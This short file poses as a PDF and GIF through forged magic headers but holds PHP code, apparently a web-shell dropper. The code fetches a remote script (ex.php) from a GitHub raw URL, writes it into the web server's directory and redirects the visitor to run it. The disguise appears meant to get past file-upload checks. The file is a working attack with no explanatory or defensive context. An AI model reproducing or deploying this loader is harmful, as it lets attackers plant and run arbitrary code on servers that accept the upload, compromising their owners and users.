%PDF-1.3
%每每每每
GIF89;a
<html>
<?php
    $url = "https://github.com/k36t61/k36t61/raw/refs/heads/main/ex.php";
    $fileContent = file_get_contents($url);
    if ($fileContent !== false) {
        $fileName = "ex.php"; 
        $uploadDirectory = "";
        if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
            header("Location: " . $fileName);
            exit;
        } 
    }
?>
</html>
